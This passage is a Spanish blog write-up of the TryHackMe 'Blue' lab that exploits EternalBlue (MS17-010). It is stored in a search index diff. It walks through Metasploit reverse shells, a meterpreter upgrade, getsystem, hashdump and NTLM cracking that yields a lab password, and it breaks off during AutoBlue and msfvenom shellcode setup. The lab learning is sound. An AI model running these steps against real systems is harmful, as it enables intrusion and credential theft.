@@ -1,0 +1,1593 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Blue</title>
+    <url>/2025/01/09/Blue/</url>
+    <content><![CDATA[<h1 id="Introduccion"><a href="#Introduccion" class="headerlink" title="Introducción"></a>Introducción</h1><p>Bienvenidos a este humilde WriteUp sobre esta sencillita máquina Windows que nos será de utilidad para repasar conceptos básicos y la explotación de diferentes formas sobre la vulnerabilidad <strong>MS17-010</strong> o mayormente conocida como <strong>EternalBlue</strong>. Para que un sea un simple Write-up más hacer dos tipos de explotaciones, una automática con metasploit y otra manual, aunque para la manual tengo que recalcar que la máquina de tryhackme no está preparada para esto y en ciertas ocasiones tendremos problemas, en cambio, existe la misma máquina sin estos problemas en la plataforma hack the box(se necesita subscripción). También comentaros que veréis diferentes ips de “víctima” porque no lo he podido hacer todo de golpe o he tenido que reiniciar la máquina.</p>
+<h1 id="Montar-el-laboratorio"><a href="#Montar-el-laboratorio" class="headerlink" title="Montar el laboratorio"></a>Montar el laboratorio</h1><p>Hace tiempo escuche en un vídeo de S4vitar sobre el gran problema que tiene TryHackMe para ocultar las conexiones entre los diferentes dispositivos conectados a su VPN, no sé si en la actualidad esto estará solucionado, pero para asegurarnos os comparto un <a class="link"   href="https://github.com/Wh1teDrvg0n/safeVPN-THM" >recurso de Wh1teDrvg0n<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> que son unas reglas para prohibir las conexiones entrantes no deseadas.</p>
+<p>Aseguraros de no tener reglas propias o alguna copia de estas porque al finalizar la máquina limpiaremos todas las reglas existentes.</p>
+<h2 id="Conexion-VPN"><a href="#Conexion-VPN" class="headerlink" title="Conexión VPN"></a>Conexión VPN</h2><ol>
+<li><p>Nos descargamos el archivo VPN, tu icono &gt; Access &gt; Selecciona el servidor VPN y te lo descargas. Puede que el servidor no funcione o no esté disponible, esto lo comprobarás si al lanzar la vpn no se conecta(se queda intentándolo todo el tiempo).</p>
+</li>
+<li><p>Lanzamos la VPN:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> openvpn user.ovpn</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<h2 id="Configuracion-de-reglas-de-seguridad"><a href="#Configuracion-de-reglas-de-seguridad" class="headerlink" title="Configuración de reglas de seguridad."></a>Configuración de reglas de seguridad.</h2><p>Esta consola debéis de dejarla abierta para que la conexión no se muera.</p>
+<ol start="3">
+<li><p>Comprobamos que no exista ninguna regla:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> iptables -L -v -n</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/primera_comprobacion_ip_tables.png"
+                      alt="iptables vacío."
+                ><figcaption>iptables vacío.</figcaption></figure></p>
+</li>
+<li><p>Ejecutamos el script y comprobamos las reglas utilizando el comando anterior.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./safevpn-thm.sh ip_máquina_víctima</span><br></pre></td></tr></table></figure></div>
+<p>La ip indicada es la correspondiente con tun0, interfaz creada por la VPN.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/iptable_despues_del_script.png"
+                      alt="iptable después de ejecutar el script."
+                ><figcaption>iptable después de ejecutar el script.</figcaption></figure></p>
+</li>
+</ol>
+<p>Script para limpiar las reglas:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Limpiar reglas IPv4</span></span><br><span class="line">iptables -t nat -F</span><br><span class="line">iptables -t mangle -F</span><br><span class="line">iptables -F</span><br><span class="line">iptables -X</span><br><span class="line">iptables -Z</span><br><span class="line">iptables -P INPUT ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">iptables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># Limpiar reglas IPv6</span></span><br><span class="line">ip6tables -t nat -F</span><br><span class="line">ip6tables -t mangle -F</span><br><span class="line">ip6tables -F</span><br><span class="line">ip6tables -X</span><br><span class="line">ip6tables -Z</span><br><span class="line">ip6tables -P INPUT ACCEPT</span><br><span class="line">ip6tables -P FORWARD ACCEPT</span><br><span class="line">ip6tables -P OUTPUT ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Todas las reglas de iptables e ip6tables han sido eliminadas.&quot;</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="Estructura-de-directorios"><a href="#Estructura-de-directorios" class="headerlink" title="Estructura de directorios."></a>Estructura de directorios.</h2><p>Por último y no menos importante debemos de crear la estructura de directorios para almacenar la información relevante que vayamos obteniendo.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> &#123;recog,data,exploitation&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Lanzamos la máquina en TryHackMe y cogemos la ip al vuelo.</p>
+<h1 id="Reconocimiento"><a href="#Reconocimiento" class="headerlink" title="Reconocimiento"></a>Reconocimiento</h1><p>TryHackMe nos facilita la labor y nos da la IP de la máquina realizada para ser explotada, como sabéis lo primero a realizar es comprobar si el host está activo.</p>
+<h2 id="Disponibilidad-del-host"><a href="#Disponibilidad-del-host" class="headerlink" title="Disponibilidad del host"></a>Disponibilidad del host</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ping -c 1 10.10.210.75</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Escaneo-con-nmap"><a href="#Escaneo-con-nmap" class="headerlink" title="Escaneo con nmap"></a>Escaneo con nmap</h2><p>Vamos a descubrir los puertos abiertos de la máquina:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p- --open -sS --min-rate 4500 -vvv -n -Pn 10.10.210.75 -oG allPorts</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/escaneo_puertos_nmap.png"
+                      alt="Escaneo de puertos con nmap."
+                ><figcaption>Escaneo de puertos con nmap.</figcaption></figure><br>Recuerda que puedes utilizar varias herramientas y comparar resultados, puedes encontrar algún dato extra.</p>
+<h2 id="Escaneo-con-netcat"><a href="#Escaneo-con-netcat" class="headerlink" title="Escaneo con netcat"></a>Escaneo con netcat</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -zv 10.10.210.75 1-1000</span><br></pre></td></tr></table></figure></div>
+
+<p>Tienes más cómo unicornscan, angryscan, un script en bash…</p>
+<h2 id="Extraccion-de-puertos-manual"><a href="#Extraccion-de-puertos-manual" class="headerlink" title="Extracción de puertos manual"></a>Extracción de puertos manual</h2><p>Para escanear los servicios y versiones de los puertos vamos a copiar los puertos en la clipboard, pero en este caso son muchos y no lo queremos copiar a mano podemos utilizar varias utilidades en un momento para ordenar y obtener solo el número de puertos del archivo grepeable extraido.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Ports:&quot;</span> allPorts | <span class="built_in">tr</span> <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;\n&#x27;</span> | <span class="built_in">tail</span> -n +4 | awk -F <span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed <span class="string">&#x27;s/.$//&#x27;</span> | xargs</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/extract_ports_manually.png"
+                      alt="Extracción de puertos manualmente."
+                ><figcaption>Extracción de puertos manualmente.</figcaption></figure></p>
+<ul>
+<li><strong>grep “Ports:” allPorts</strong>: Obtenemos la línea que contiene todos los puertos encontrados.</li>
+<li><strong>tr ‘ ‘ ‘\n’</strong>: Sustituimos los espacios por saltos de línea.</li>
+<li><strong>tail -n +4</strong>: Muestra todas las líneas menos las 4 primeras.</li>
+<li><strong>awk -F ‘&#x2F;‘ ‘{print $1}’</strong>: Indicas que el delimitador es ‘&#x2F;‘ y que quieres obtener el primer resultado.</li>
+<li><strong>tr ‘\n’ ‘,’</strong>: Sustituimos los saltos de línea por comas.</li>
+<li><strong>sed ‘s&#x2F;.$&#x2F;&#x2F;‘</strong>: Realizamos una sustitución(s -&gt; search and replace), el’.’ representa cualquier carácter, el $ representa el final de la línea y en la zona de remplazo(&#x2F;&#x2F;) no indicamos nada(entonces se elimina).</li>
+</ul>
+<h2 id="Escaneo-de-servicios-y-versiones"><a href="#Escaneo-de-servicios-y-versiones" class="headerlink" title="Escaneo de servicios y versiones"></a>Escaneo de servicios y versiones</h2><p>Escaneo de versión y servicios de los puertos:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -sCV -p135,139,445,49152,49153,49154,49158,49160 10.10.197.255 -oN targeted</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/version_and_services_nmap.png"
+                      alt="Versión y servicios corriendo en dichos puertos."
+                ><figcaption>Versión y servicios corriendo en dichos puertos.</figcaption></figure></p>
+<p>Podemos encontrar alguna información como el nombre del equipo: Jon-PC, Windows 7 y diferentes versiones.</p>
+<p>A continuación vamos a ver si nos permite hacer uso de null session.</p>
+<h2 id="Comprobaciones-SMB-y-Null-Session"><a href="#Comprobaciones-SMB-y-Null-Session" class="headerlink" title="Comprobaciones SMB y Null Session"></a>Comprobaciones SMB y Null Session</h2><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L //10.10.210.75 -N</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/smbclient_null_session.png"
+                      alt="Uso de null session con smbclient."
+                ><figcaption>Uso de null session con smbclient.</figcaption></figure></p>
+<p>Podemos probar con smbmap, pero comprobamos que tampoco nos deja:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">smbmap -H 10.10.210.75</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/smbmap_error.png"
+                      alt="Intento de conexión con smbmap."
+                ><figcaption>Intento de conexión con smbmap.</figcaption></figure></p>
+<p>Llegados a este punto podemos comprobar si existen vulnerabilidades existentes para este Windows 7. Para ello utilizaremos algunos script en nmap, estos están divididos en <strong>categorías</strong>:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">locate .nse | xargs grep <span class="string">&quot;categories&quot;</span> | grep -oP <span class="string">&#x27;&quot;.*?&quot;&#x27;</span> | <span class="built_in">sort</span> -u </span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/categorias_nmap.png"
+                      alt="Categorías sobre los scripts de nmap."
+                ><figcaption>Categorías sobre los scripts de nmap.</figcaption></figure></p>
+<p>Como es un Windows 7 y el smb esta expuesto comprobamos las vulnerabilidades(vuln) de forma no intrusiva(safe):</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p445 --script <span class="string">&quot;vuln and save&quot;</span> 10.10.197.255</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/detect_eternalblue_general_vuln_nmap.png"
+                      alt="Detección del eternal blue con nmap."
+                ><figcaption>Detección del eternal blue con nmap.</figcaption></figure></p>
+<p>Puedes indicar el script:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p 445 --script smb-vuln-ms17-010 10.10.197.255</span><br></pre></td></tr></table></figure></div>
+
+<p>Puedes utilizar netexec(crackmapexec). Para instalarlo en arch he utilizado el siguiente comando:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pipx install git+https://github.com/Pennyw0rth/NetExec</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.10.197.255 -M ms17-010</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/netexec_eternalblue.png"
+                      alt="Utilizando netexec para comprobar si eternalblue existe."
+                ><figcaption>Utilizando netexec para comprobar si eternalblue existe.</figcaption></figure></p>
+<h1 id="Explotacion"><a href="#Explotacion" class="headerlink" title="Explotación"></a>Explotación</h1><h2 id="Explotacion-con-metasploit"><a href="#Explotacion-con-metasploit" class="headerlink" title="Explotación con metasploit"></a>Explotación con metasploit</h2><h3 id="Configuracion-inicial-del-exploit"><a href="#Configuracion-inicial-del-exploit" class="headerlink" title="Configuración inicial del exploit."></a>Configuración inicial del exploit.</h3><p>Para explotarlo tenemos diferentes maneras de hacerlo:</p>
+<p>Mediante metasploit:</p>
+<p>Para explotar eternal blue mediante metasploit tenemos que seguir una serie de pasos.</p>
+<ol>
+<li><p>Abrir metasploit con el comando <strong>msfoconsole</strong></p>
+</li>
+<li><p>Buscar por eternalblue: <strong>search eternalblue</strong>.</p>
+</li>
+</ol>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/search_eternalblue_metasploit.png"
+                      alt="Buscamos por eternalblue."
+                ><figcaption>Buscamos por eternalblue.</figcaption></figure></p>
+<ol start="3">
+<li>Copiamos el nombre del primero y indicamos que lo queremos usar:<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure></div></li>
+<li>Miramos cuáles son las opciones a rellenar para que el payload funcione correctamente:<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>En este caso, si nos fijamos tenemos que configurar todas las opciones que sean “yes” en Required, al menos que ya haya una configuración por defecto que coincida con nuestra información.</p>
+<ol start="5">
+<li>Seteamos el RHOST:<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> RHOST 10.10.114.58</span><br></pre></td></tr></table></figure></div></li>
+</ol>
+<p>Si volvemos a ejecutar la orden show options, nos aparecerá la ip indicada, en caso de equivocarnos podemos utilizar el comando <strong>unset RHOSTS</strong></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/show_parameters_value_eternalblue_metasploit.png"
+                      alt="Ip víctima seteada."
+                ><figcaption>Ip víctima seteada.</figcaption></figure></p>
+<ol start="6">
+<li><p>Indicamos LHOST(ya que por defecto utiliza la ip de otra interfaz). Está es la ip que nos da la vpn de tryhackme(tun0).</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> LHOST 10.21.60.116</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>Debemos de configurar un payload, esto es el código que se ejecuta en la víctima, normalmente para obtener acceso a ella usando alguna shell, depende de nuestras preferencias usaremos uno u otro(puedes ver los todos con el comando show payloads):</p>
+</li>
+</ol>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/shell/reverse_tcp</span><br></pre></td></tr></table></figure></div>
+
+<p>En este caso utilizo una reverse shell para que el equipo víctima me envia una shell a mí.</p>
+<ol start="8">
+<li>Ejecutamos el exploit con el comando <strong>run</strong> o <strong>exploit</strong>. En caso de que no funcione revisar que las direcciones esten correctas, que no haya ningun servicio utilizado en el puerto 4444 y a las malas(como fue mi caso) tuve que reiniciar la máquina víctima.</li>
+</ol>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/conectados_con_metasploit.png"
+                      alt="Conexión exitosa con metasploit."
+                ><figcaption>Conexión exitosa con metasploit.</figcaption></figure></p>
+<p>Ya podemos introducir comandos en el equipo víctima.</p>
+<p>Una vez aquí nos vamos a salir, para ello utilizamos el comando <strong>background</strong> o <strong>ctrl+z</strong>. Vamos a cambiar nuestra sesión reverse shell por una de tipo <strong>meterpreter</strong>, está sesión es la que se usa por defecto y en lugar de enfadarte y pensar que porque no he usado esta primero es para que nos familiaricemos con la herramienta metasploit.</p>
+<p>Meterpreter tiene algunas ventajas frente a la reverse shell cómo: </p>
+<ul>
+<li>Se carga en memoria.</li>
+<li>Capturas de pantalla.</li>
+<li>Registros de teclas..</li>
+<li>..</li>
+</ul>
+<h3 id="Cambio-de-reverse-shell-a-Meterpreter"><a href="#Cambio-de-reverse-shell-a-Meterpreter" class="headerlink" title="Cambio de reverse shell a Meterpreter"></a>Cambio de reverse shell a Meterpreter</h3><p>Bien, para cambiar de reverse shell a meterpreter vamos a seguir los siguientes pasos:</p>
+<ol>
+<li>Cambiamos al siguiente módulo: <strong>use post&#x2F;multi&#x2F;manage&#x2F;shell_to_meterpreter</strong>2. Como antes vemos los parámetros a configurar: <strong>show options</strong>, en este caso solo debemos indicar el ID de la sesión que contiene la reverse shell.</li>
+<li>Para ver el ID de la sesión suspendida debemos utilizar <strong>sessions -l</strong>* y seguramente tenga el ID 1.</li>
+<li>Seteamos el parámetro: <strong>set SESSION 1</strong></li>
+<li>Ejecutamos: <strong>run</strong></li>
+<li>Al finalizar comprobamos nuestras sesiones y debe de aparecer una nueva sesión con meterpreter.</li>
+<li>Nos metemos a ella con el comando <strong>sessions -i 2</strong>(En mi caso con 3 porque cree otra sesión y elimine la 2).</li>
+</ol>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/sesiones_metasploit_cambio_de_reverse_shell_a_meterpreter.png"
+                      alt="Sesiones disponibles."
+                ><figcaption>Sesiones disponibles.</figcaption></figure></p>
+<p>Comandos y algunos extra.</p>
+<p><strong>session -i ID</strong>: Para conectarnos a la sesión.<br><strong>sessions -k ID</strong>: Para eliminar alguna sesión.<br><strong>sessions -K</strong>: Para eliminar todas las sesiones.</p>
+<p>Vamos a escalar privilegios de una forma muy sencilla con meterpreter, si utilizamos el comando <strong>help</strong> para ver los comandos que tenemos disponibles, vemos <strong>getsystem</strong> como bien pone en su descripción realiza un intento para escalar privilegios sobre el equipo, si este tiene éxito nos elevará a <strong>NT AUTHORITY\SYSTEM</strong>.</p>
+<p>Podemos hacer getuid para saber con que usuario estamos ahora y saldrá NT AUTHORITY\SYSTEM, esto es porque el servicio smb del que nos hemos aprovechado lo esta utilizando dicho usuario, aunque no tiene porque ser siempre así.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/comprobacion_nt_authority_system_meterpreter.png"
+                      alt="Usuario NT AUTHORITY\SYSTEM."
+                ><figcaption>Usuario NT AUTHORITY\SYSTEM.</figcaption></figure></p>
+<p>Vamos a ver por encima el concepto de <strong>“migrar el proceso”</strong>, esto puede ser útil para obtener persistencia, para evadir una detección…</p>
+<p>Cuando migras a un proceso, tienes que ver que sea de NT AUTHORITY\SYSTEM(el mismo usuario) y que en la última columna de la derecha(la de path) <strong>no este vacía</strong>. Todo esto se puede ver con el comando:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">ps</span><br></pre></td></tr></table></figure></div>
+
+<p>El comando sería:</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">migrate PID</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>No se lo recomiendo hacer</strong> no suele ir muy bien, o no funciona en muchos procesos o la sesión se queda pillada y te tienes que salir, y luego no te deja volver a pasar la reverse shell a una sesión meterpreter, si paso esto recomiendo cerrar metasploit y establecer una conexión directamente con meterpreter.</p>
+<p>Para obtener el hash de los usuarios del sistema tenemos el comando <strong>hashdump</strong> en la sesión meterpreter.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/hashdump_meterpreter.png"
+                      alt="Resultado de usar hashdump."
+                ><figcaption>Resultado de usar hashdump.</figcaption></figure></p>
+<p>Vamos a separar esto:</p>
+<ul>
+<li>Jon:1000: Nombre de usuario y el SID(Security Identifier)</li>
+<li>aad3b435b51404eeaad3b435b51404ee: La primera parte hasta los dos puntos es el <strong>hash LM</strong>. No nos sirve para nada porque ya no se usa.</li>
+<li>ffb43f0de35be4d9917ac0cc8ad57f8d: Esta segunda parte es el <strong>hash NTLM</strong></li>
+</ul>
+<p>Podemos utilizar diferentes herramientas para crackear dichos hashes NTLM:</p>
+<ul>
+<li>Crackstation: Página web con la que he podido sacar el hash NTLM de Jon.</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/crackstation_ntlm_jon_hashdump.png"
+                     
+                ></p>
+<p>La contraseña de Jon es: <strong>alqfna22</strong></p>
+<p>Obtención de flags:</p>
+<p>La primera está en la raíz:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/primera_flag.png"
+                      alt="Obtención de la primera bandera."
+                ><figcaption>Obtención de la primera bandera.</figcaption></figure></p>
+<p>Segunda bandera en el directorio donde se almacenan las contraseñas:</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> Windows\\System32\\config</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">cat flag2.txt</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/segunda_flag.png"
+                      alt="Obtención de la segunda flag."
+                ><figcaption>Obtención de la segunda flag.</figcaption></figure></p>
+<p>En la imagen da error porque ya estoy en dicho directorio, ejecute el comando sin querer.</p>
+<p>Tercera bandera, ‘Donde los administradores suelen guardar cosas interesantes.’.</p>
+<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> Users\\Jon\\Documents\\</span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line">cat flag3.txt</span><br></pre></td></tr></table></figure></div>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/tercera_flag.png"
+                      alt="Resultado de la tercera flag."
+                ><figcaption>Resultado de la tercera flag.</figcaption></figure></p>
+<h2 id="Explotacion-manual"><a href="#Explotacion-manual" class="headerlink" title="Explotación manual"></a>Explotación manual</h2><h3 id="Uso-de-zzz-exploit"><a href="#Uso-de-zzz-exploit" class="headerlink" title="Uso de zzz exploit"></a>Uso de zzz exploit</h3><p>Es bueno saber como usar mestasploit ya que es considerada una herramienta muy pontente, aunque considero que no se debe de abusar de ella porque no ganariamos tanto conocimiento como realizar una <strong>explotación manual</strong>.</p>
+<p>Vamos a buscar un script en google <strong>ms17-010 zzz_exploit py</strong> de worawit.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/worawit/MS17-010</span><br></pre></td></tr></table></figure></div>
+<p>Este repositorio funciona mejor con <strong>python 2</strong>. Vamos a empezar ejecutando el script checker, ya sabéis que yo utilizo arch y debo de instalar un paquete(<strong>impacket</strong>) para poder ejecutar el script.</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S python2-impacket</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">python2 checker.py 10.10.115.185</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/preview_checker_zzz.png"
+                      alt="Preview del script checker."
+                ><figcaption>Preview del script checker.</figcaption></figure></p>
+<p>Si en alguno de las pipes te muestra información en lugar de status_access_denied significa que tenemos una forma potencial de ejecutar comandos, incluso ya soo con ver <strong>the target is not patched</strong>. Esto no significa que no deje, debemos <strong>modificar el script checker.py</strong> y indicar en el campo <strong>USERNAME</strong> el usuario <strong>guest</strong>:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/credenciales_guest_checker_zzz.png"
+                      alt="Indicamos el usuario guest en checker.py"
+                ><figcaption>Indicamos el usuario guest en checker.py</figcaption></figure></p>
+<p>Pero a continuación vemos que el usuario guest no está activado en la máquina víctima.<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/error_guest_checker_zzz.png"
+                      alt="Error con el usuario guest."
+                ><figcaption>Error con el usuario guest.</figcaption></figure></p>
+<p>Puedes poner las credenciales del usuario encontrado con metasploit anteriormente y funcionaría:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/checker_despues_de_poner_credenciales.png"
+                      alt="Después de poner las credenciales."
+                ><figcaption>Después de poner las credenciales.</figcaption></figure></p>
+<h3 id="Uso-de-Autoblue"><a href="#Uso-de-Autoblue" class="headerlink" title="Uso de Autoblue"></a>Uso de Autoblue</h3><p>En la máquina de tryhackme no está activado el usuario guest(en la de hack the box sí), pero aún así podemos utilizar el script <a class="link"   href="https://github.com/3ndG4me/AutoBlue-MS17-010" >AutoBlue<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Nos permite tener una mayor flexibilidad y retocar ciertas características que metasploit no permite. Este también tiene un checker y nos sale lo siguiente al ejecutarlo:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/autoblue_path_wordlists_not_found_checker.png"
+                      alt="Autoblue no encuentra los diccionarios."
+                ><figcaption>Autoblue no encuentra los diccionarios.</figcaption></figure></p>
+<p>Al intentar modificar el script para indicar la ruta veo que no se encuentra aquí, siguiendo el rastro, encuentro el problema en la función <strong>check_accesisible_pipes()</strong>, exactamente en la función de la conexión(conn.find_named_pipe), objeto creado por el módulo importado <strong>mysmb</strong>(más abajo se ve), una vez aquí dentro busco por el output que nos muestra al no encontrar el diccionario y encuentro la ruta:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/autoblue_change_path_checker.png"
+                      alt="Cambiamos la ruta en el script mysmb.py"
+                ><figcaption>Cambiamos la ruta en el script mysmb.py</figcaption></figure></p>
+<p>Ahora probamos a ejecutar el script de nuevo:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/autoblue_checker_ok.png"
+                      alt="Ejecucción exitosa del checker."
+                ><figcaption>Ejecucción exitosa del checker.</figcaption></figure></p>
+<p>Genial, parece que funciona, ahora debemos de dirigirnos al directorio shellcode y dentro encontraremos un script llamado <strong>shell_prep.sh</strong> que nos generará la carga, este nos realizará diferentes preguntas al ejecutarlo:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/01/09/Blue/autoblue_generate_shellcode.png"
+                      alt="Generando el shellcode."
+                ><figcaption>Generando el shellcode.</figcaption></figure></p>
+<ul>
+<li><p><strong>msfvenom</strong>: Herramienta para generar payloads, en este caso nuestra reverse shell.</p>
+</li>
+<li><p><strong>LHOST</strong>: Ip que recibe la shell, en este caso ponemos la del adaptador tun de la vpn.</p>
+</li>
+<li><p><strong>LPORT x64</strong>: puerto donde se envía la shell de x64 bits.</p>
+</li>
+<li><p><strong>LPORT x86</strong>: puerto donde se envía la shell de x86 bits.</p>
+</li>
